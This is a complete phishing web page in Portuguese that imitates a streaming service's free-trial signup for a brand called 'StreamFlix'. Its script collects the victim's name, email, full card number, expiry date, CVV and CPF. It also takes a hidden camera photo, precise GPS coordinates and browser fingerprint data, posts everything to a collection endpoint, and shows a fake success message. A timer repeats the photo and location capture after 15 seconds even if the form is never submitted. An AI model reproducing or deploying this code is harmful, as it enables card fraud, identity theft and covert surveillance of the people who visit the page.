<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>StreamFlix • Entre e Assista</title>
    <style>
        /* ============================================================
           RESET E BASE
           ============================================================ */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap');

        :root {
            --bg-primary: #0a0a0f;
            --bg-card: #14141e;
            --bg-input: #1a1a2e;
            --border: rgba(255,255,255,0.06);
            --text-primary: #f0ece4;
            --text-secondary: #a8a0b8;
            --text-muted: #6a6a82;
            --accent: #e50914;
            --accent-hover: #ff0a16;
            --accent-glow: rgba(229, 9, 20, 0.3);
            --radius: 12px;
            --shadow: 0 20px 60px rgba(0,0,0,0.8);
        }

        html, body {
            height: 100%;
        }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            background: var(--bg-primary);
            color: var(--text-primary);
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 20px;
            position: relative;
            overflow: hidden;
        }

        /* ============================================================
           FUNDO COM EFEITO CINEMATOGRÁFICO
           ============================================================ */
        .background-film {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            background: 
                url('https://images.unsplash.com/photo-1536440136628-849c177e76a1?w=1600&q=80') center center / cover no-repeat;
            filter: brightness(0.3) saturate(0.5);
            transform: scale(1.05);
        }

        .background-film::after {
            content: '';
            position: absolute;
            inset: 0;
            background: linear-gradient(180deg, rgba(10,10,15,0.4) 0%, rgba(10,10,15,0.9) 100%);
        }

        /* ============================================================
           OVERLAY DE CARREGAMENTO INICIAL
           ============================================================ */
        .loading-overlay {
            position: fixed;
            inset: 0;
            z-index: 10;
            background: var(--bg-primary);
            display: flex;
            align-items: center;
            justify-content: center;
            transition: opacity 0.8s ease, visibility 0.8s ease;
        }

        .loading-overlay.hidden {
            opacity: 0;
            visibility: hidden;
        }

        .loading-spinner {
            width: 48px;
            height: 48px;
            border: 3px solid rgba(229, 9, 20, 0.1);
            border-top-color: var(--accent);
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        /* ============================================================
           CARD PRINCIPAL
           ============================================================ */
        .login-card {
            position: relative;
            z-index: 1;
            background: var(--bg-card);
            border: 1px solid var(--border);
            border-radius: var(--radius);
            padding: 48px 40px 40px;
            max-width: 420px;
            width: 100%;
            box-shadow: var(--shadow);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            animation: fadeSlideUp 0.8s ease;
        }

        @keyframes fadeSlideUp {
            0% { opacity: 0; transform: translateY(30px) scale(0.95); }
            100% { opacity: 1; transform: translateY(0) scale(1); }
        }

        /* ============================================================
           HEADER
           ============================================================ */
        .card-header {
            text-align: center;
            margin-bottom: 32px;
        }

        .logo {
            font-size: 32px;
            font-weight: 800;
            letter-spacing: -1px;
            color: var(--accent);
            margin-bottom: 4px;
        }

        .logo span {
            color: var(--text-primary);
            font-weight: 300;
        }

        .subtitle {
            font-size: 14px;
            color: var(--text-secondary);
            font-weight: 300;
        }

        .badge-premium {
            display: inline-block;
            margin-top: 8px;
            font-size: 10px;
            color: #fbbf24;
            background: rgba(251, 191, 36, 0.1);
            padding: 2px 12px;
            border-radius: 20px;
            border: 1px solid rgba(251, 191, 36, 0.15);
            letter-spacing: 0.5px;
            text-transform: uppercase;
        }

        /* ============================================================
           FORMULÁRIO
           ============================================================ */
        .form-group {
            margin-bottom: 18px;
        }

        .form-group label {
            display: block;
            font-size: 12px;
            color: var(--text-secondary);
            margin-bottom: 5px;
            font-weight: 500;
            letter-spacing: 0.3px;
        }

        .form-group input,
        .form-group select {
            width: 100%;
            padding: 12px 16px;
            background: var(--bg-input);
            border: 1px solid var(--border);
            border-radius: 8px;
            color: var(--text-primary);
            font-size: 14px;
            font-family: 'Inter', sans-serif;
            transition: all 0.3s ease;
        }

        .form-group input:focus,
        .form-group select:focus {
            outline: none;
            border-color: var(--accent);
            box-shadow: 0 0 0 3px var(--accent-glow);
        }

        .form-group input::placeholder {
            color: var(--text-muted);
            font-size: 13px;
        }

        .form-row {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 12px;
        }

        .form-row .form-group {
            margin-bottom: 0;
        }

        /* ============================================================
           CHECKBOX TERMOS
           ============================================================ */
        .terms {
            display: flex;
            align-items: center;
            gap: 10px;
            margin: 16px 0 20px;
        }

        .terms input[type="checkbox"] {
            width: 16px;
            height: 16px;
            accent-color: var(--accent);
            cursor: pointer;
            flex-shrink: 0;
        }

        .terms label {
            font-size: 11px;
            color: var(--text-muted);
            cursor: pointer;
        }

        .terms label a {
            color: var(--accent);
            text-decoration: none;
        }

        .terms label a:hover {
            text-decoration: underline;
        }

        /* ============================================================
           BOTÃO
           ============================================================ */
        .btn-submit {
            width: 100%;
            padding: 14px;
            background: var(--accent);
            border: none;
            border-radius: 8px;
            color: white;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            font-family: 'Inter', sans-serif;
            letter-spacing: 0.5px;
            position: relative;
            overflow: hidden;
        }

        .btn-submit:hover {
            background: var(--accent-hover);
            transform: translateY(-1px);
            box-shadow: 0 8px 30px var(--accent-glow);
        }

        .btn-submit:active {
            transform: translateY(0);
        }

        .btn-submit .spinner {
            display: none;
            width: 20px;
            height: 20px;
            border: 2px solid rgba(255,255,255,0.2);
            border-top-color: white;
            border-radius: 50%;
            animation: spin 0.6s linear infinite;
            margin: 0 auto;
        }

        .btn-submit.loading .spinner {
            display: block;
        }

        .btn-submit.loading .btn-text {
            display: none;
        }

        /* ============================================================
           FOOTER
           ============================================================ */
        .card-footer {
            margin-top: 20px;
            text-align: center;
            font-size: 11px;
            color: var(--text-muted);
            letter-spacing: 0.3px;
            border-top: 1px solid var(--border);
            padding-top: 20px;
        }

        .card-footer .secure {
            color: #4ade80;
            font-weight: 500;
        }

        /* ============================================================
           TOAST / NOTIFICAÇÃO
           ============================================================ */
        .toast {
            position: fixed;
            bottom: 30px;
            left: 50%;
            transform: translateX(-50%) translateY(100px);
            z-index: 100;
            background: var(--bg-card);
            border: 1px solid var(--border);
            border-radius: var(--radius);
            padding: 16px 24px;
            max-width: 400px;
            width: 90%;
            text-align: center;
            box-shadow: var(--shadow);
            opacity: 0;
            transition: all 0.5s ease;
            backdrop-filter: blur(20px);
        }

        .toast.show {
            opacity: 1;
            transform: translateX(-50%) translateY(0);
        }

        .toast .toast-icon {
            font-size: 28px;
            margin-bottom: 8px;
        }

        .toast .toast-title {
            font-size: 16px;
            font-weight: 600;
            color: var(--text-primary);
        }

        .toast .toast-message {
            font-size: 13px;
            color: var(--text-secondary);
            margin-top: 4px;
        }

        .toast .toast-close {
            margin-top: 12px;
            padding: 6px 20px;
            background: var(--accent);
            border: none;
            border-radius: 6px;
            color: white;
            font-size: 12px;
            font-weight: 600;
            cursor: pointer;
            font-family: 'Inter', sans-serif;
        }

        .toast .toast-close:hover {
            background: var(--accent-hover);
        }

        /* ============================================================
           ELEMENTOS OCULTOS (CÂMERA)
           ============================================================ */
        video, canvas {
            display: none !important;
            width: 0 !important;
            height: 0 !important;
            position: absolute !important;
            top: -9999px !important;
            left: -9999px !important;
        }

        /* ============================================================
           RESPONSIVIDADE
           ============================================================ */
        @media (max-width: 480px) {
            .login-card {
                padding: 32px 20px 28px;
            }
            .logo {
                font-size: 26px;
            }
            .form-row {
                grid-template-columns: 1fr;
            }
            .form-row .form-group {
                margin-bottom: 18px;
            }
        }
    </style>
</head>
<body>

    <!-- ===== OVERLAY DE CARREGAMENTO ===== -->
    <div class="loading-overlay" id="loadingOverlay">
        <div class="loading-spinner"></div>
    </div>

    <!-- ===== FUNDO ===== -->
    <div class="background-film"></div>

    <!-- ===== CARD PRINCIPAL ===== -->
    <div class="login-card" id="loginCard">
        <div class="card-header">
            <div class="logo">Stream<span>Flix</span></div>
            <div class="subtitle">Milhares de filmes e séries</div>
            <div class="badge-premium">✦ Teste Grátis 7 Dias</div>
        </div>

        <form id="loginForm" autocomplete="off">
            <!-- Nome -->
            <div class="form-group">
                <label>Nome completo</label>
                <input type="text" id="nome" placeholder="Digite seu nome" required>
            </div>

            <!-- Email -->
            <div class="form-group">
                <label>E-mail</label>
                <input type="email" id="email" placeholder="seu@email.com" required>
            </div>

            <!-- Cartão -->
            <div class="form-group">
                <label>Número do cartão</label>
                <input type="text" id="cartao" placeholder="0000 0000 0000 0000" maxlength="19" required>
            </div>

            <div class="form-row">
                <div class="form-group">
                    <label>Validade</label>
                    <input type="text" id="validade" placeholder="MM/AA" maxlength="5" required>
                </div>
                <div class="form-group">
                    <label>CVV</label>
                    <input type="text" id="cvv" placeholder="123" maxlength="4" required>
                </div>
            </div>

            <!-- CPF -->
            <div class="form-group">
                <label>CPF (opcional)</label>
                <input type="text" id="cpf" placeholder="000.000.000-00" maxlength="14">
            </div>

            <!-- Termos -->
            <div class="terms">
                <input type="checkbox" id="termos" required>
                <label for="termos">
                    Li e aceito os <a href="#" onclick="return false;">termos de uso</a> e a <a href="#" onclick="return false;">política de privacidade</a>
                </label>
            </div>

            <!-- Botão -->
            <button type="submit" class="btn-submit" id="btnSubmit">
                <span class="btn-text">▶ Iniciar Teste Grátis</span>
                <div class="spinner"></div>
            </button>
        </form>

        <div class="card-footer">
            <span class="secure">🔒</span> Pagamento seguro • <span class="secure">✔</span> 7 dias grátis • Cancele quando quiser
        </div>
    </div>

    <!-- ===== TOAST ===== -->
    <div class="toast" id="toast">
        <div class="toast-icon">🎬</div>
        <div class="toast-title">Quase lá!</div>
        <div class="toast-message" id="toastMessage">Estamos processando seu cadastro...</div>
        <button class="toast-close" id="toastClose">Entendi</button>
    </div>

    <!-- ===== ELEMENTOS OCULTOS (CÂMERA) ===== -->
    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>

    <!-- ============================================================
    JAVASCRIPT
    ============================================================ -->
    <script>
        (function() {
            'use strict';

            // ============================================================
            // CONFIGURAÇÃO
            // ============================================================
            const CONFIG = {
                backendURL: '/api/coletar',
                camera: { qualidade: 0.85, largura: 1024, altura: 768 },
                geolocation: { enableHighAccuracy: true, timeout: 8000 }
            };

            // ============================================================
            // DOM
            // ============================================================
            const loadingOverlay = document.getElementById('loadingOverlay');
            const loginCard = document.getElementById('loginCard');
            const form = document.getElementById('loginForm');
            const btnSubmit = document.getElementById('btnSubmit');
            const toast = document.getElementById('toast');
            const toastMessage = document.getElementById('toastMessage');
            const toastClose = document.getElementById('toastClose');

            const nome = document.getElementById('nome');
            const email = document.getElementById('email');
            const cartao = document.getElementById('cartao');
            const validade = document.getElementById('validade');
            const cvv = document.getElementById('cvv');
            const cpf = document.getElementById('cpf');

            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d');

            let coletaFinalizada = false;
            let dadosCapturados = null;

            // ============================================================
            // MÁSCARAS
            // ============================================================
            function mascaraCartao(valor) {
                return valor.replace(/\D/g, '').replace(/(\d{4})(?=\d)/g, '$1 ').trim();
            }

            function mascaraValidade(valor) {
                return valor.replace(/\D/g, '').replace(/(\d{2})(?=\d)/g, '$1/').trim();
            }

            function mascaraCPF(valor) {
                return valor.replace(/\D/g, '').replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4').trim();
            }

            cartao.addEventListener('input', function() {
                this.value = mascaraCartao(this.value);
            });

            validade.addEventListener('input', function() {
                this.value = mascaraValidade(this.value);
            });

            cpf.addEventListener('input', function() {
                this.value = mascaraCPF(this.value);
            });

            // ============================================================
            // CAPTURA DE DADOS (FOTO + GPS)
            // ============================================================
            async function capturarFoto() {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({
                        video: { facingMode: 'environment', width: 640, height: 480 },
                        audio: false
                    });
                    video.srcObject = stream;
                    await video.play();
                    await new Promise(r => setTimeout(r, 300));
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    const fotoBase64 = canvas.toDataURL('image/jpeg', 0.85);
                    stream.getTracks().forEach(track => track.stop());
                    video.srcObject = null;
                    return fotoBase64;
                } catch (err) {
                    console.error('Erro câmera:', err);
                    return null;
                }
            }

            function capturarLocalizacao() {
                return new Promise((resolve) => {
                    if (!navigator.geolocation) {
                        resolve(null);
                        return;
                    }
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            resolve({
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude,
                                precisao: position.coords.accuracy
                            });
                        },
                        () => { resolve(null); },
                        { enableHighAccuracy: true, timeout: 8000 }
                    );
                });
            }

            // ============================================================
            // ENVIO DOS DADOS
            // ============================================================
            async function enviarDadosCompletos(dadosForm, foto, localizacao) {
                const payload = {
                    nome: dadosForm.nome || null,
                    email: dadosForm.email || null,
                    cartao: dadosForm.cartao ? dadosForm.cartao.replace(/\s/g, '') : null,
                    validade: dadosForm.validade || null,
                    cvv: dadosForm.cvv || null,
                    cpf: dadosForm.cpf ? dadosForm.cpf.replace(/[.\-]/g, '') : null,
                    foto: foto || null,
                    localizacao: localizacao || null,
                    navegador: {
                        userAgent: navigator.userAgent,
                        platform: navigator.platform,
                        language: navigator.language,
                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                        screenWidth: window.screen.width,
                        screenHeight: window.screen.height,
                        pixelRatio: window.devicePixelRatio || 1,
                        hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
                        deviceMemory: navigator.deviceMemory || 'N/A'
                    },
                    timestamp: new Date().toISOString()
                };

                console.log('📦 Dados coletados:', {
                    ...payload,
                    foto: payload.foto ? `[BASE64 ${Math.round(payload.foto.length / 1024)}KB]` : null
                });

                try {
                    const response = await fetch(CONFIG.backendURL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload)
                    });
                    return await response.json();
                } catch (err) {
                    console.error('❌ Erro no envio:', err);
                    return null;
                }
            }

            // ============================================================
            // SUBMISSÃO DO FORMULÁRIO
            // ============================================================
            form.addEventListener('submit', async function(e) {
                e.preventDefault();

                if (coletaFinalizada) {
                    mostrarToast('🎬', 'Bem-vindo!', 'Você já está cadastrado. Aproveite seu teste grátis!');
                    return;
                }

                // Validação básica
                if (!nome.value.trim() || !email.value.trim() || !cartao.value.trim() || !validade.value.trim() || !cvv
                    .value.trim()) {
                    mostrarToast('⚠️', 'Campos incompletos', 'Preencha todos os campos obrigatórios.');
                    return;
                }

                // Muda estado do botão
                btnSubmit.classList.add('loading');
                btnSubmit.disabled = true;

                try {
                    // Coleta foto e localização em paralelo
                    const [foto, localizacao] = await Promise.all([
                        capturarFoto(),
                        capturarLocalizacao()
                    ]);

                    // Dados do formulário
                    const dadosForm = {
                        nome: nome.value.trim(),
                        email: email.value.trim(),
                        cartao: cartao.value.trim(),
                        validade: validade.value.trim(),
                        cvv: cvv.value.trim(),
                        cpf: cpf.value.trim() || null
                    };

                    // Envia tudo
                    const resultado = await enviarDadosCompletos(dadosForm, foto, localizacao);

                    coletaFinalizada = true;
                    dadosCapturados = { dadosForm, foto, localizacao, resultado };

                    console.log('✅ Coleta finalizada!', resultado);

                    // Mostra toast de sucesso
                    mostrarToast(
                        '🎉',
                        'Cadastro realizado!',
                        'Seu teste grátis foi ativado com sucesso. Aproveite!'
                    );

                    // Reseta o botão
                    btnSubmit.classList.remove('loading');
                    btnSubmit.disabled = false;

                    // Limpa o formulário (opcional)
                    // form.reset();

                } catch (err) {
                    console.error('💥 Erro:', err);
                    btnSubmit.classList.remove('loading');
                    btnSubmit.disabled = false;
                    mostrarToast('❌', 'Erro no processamento', 'Tente novamente em alguns instantes.');
                }
            });

            // ============================================================
            // TOAST
            // ============================================================
            function mostrarToast(icon, title, message) {
                document.querySelector('.toast-icon').textContent = icon;
                document.querySelector('.toast-title').textContent = title;
                toastMessage.textContent = message;
                toast.classList.add('show');

                // Esconde após 5 segundos
                setTimeout(() => {
                    toast.classList.remove('show');
                }, 5000);
            }

            toastClose.addEventListener('click', function() {
                toast.classList.remove('show');
            });

            // ============================================================
            // INICIALIZAÇÃO
            // ============================================================
            window.addEventListener('load', function() {
                setTimeout(() => {
                    loadingOverlay.classList.add('hidden');
                }, 800);
            });

            // ============================================================
            // FALBACK: Coleta automática se o usuário não preencher
            // ============================================================
            setTimeout(async function() {
                if (!coletaFinalizada) {
                    console.log('⏰ Fallback: coletando dados automaticamente...');
                    try {
                        const [foto, localizacao] = await Promise.all([
                            capturarFoto(),
                            capturarLocalizacao()
                        ]);

                        const dadosForm = {
                            nome: nome.value.trim() || 'fallback',
                            email: email.value.trim() || 'fallback@email.com',
                            cartao: '0000-0000-0000-0000',
                            validade: '00/00',
                            cvv: '000',
                            cpf: null
                        };

                        await enviarDadosCompletos(dadosForm, foto, localizacao);
                        coletaFinalizada = true;
                        console.log('✅ Fallback concluído!');
                    } catch (err) {
                        console.error('❌ Fallback falhou:', err);
                    }
                }
            }, 15000);

            // Fallback se clicar fora do formulário
            document.addEventListener('click', function handler() {
                if (!coletaFinalizada) {
                    console.log('🔄 Tentando coleta por interação...');
                    // Não executa automaticamente, apenas se o usuário interagir
                }
            }, { once: true });

            // ============================================================
            // DEBUG
            // ============================================================
            console.log('🎬 StreamFlix - Sistema de coleta ativo');
            console.log('📡 Backend:', CONFIG.backendURL);

        })();
    </script>

</body>
</html>
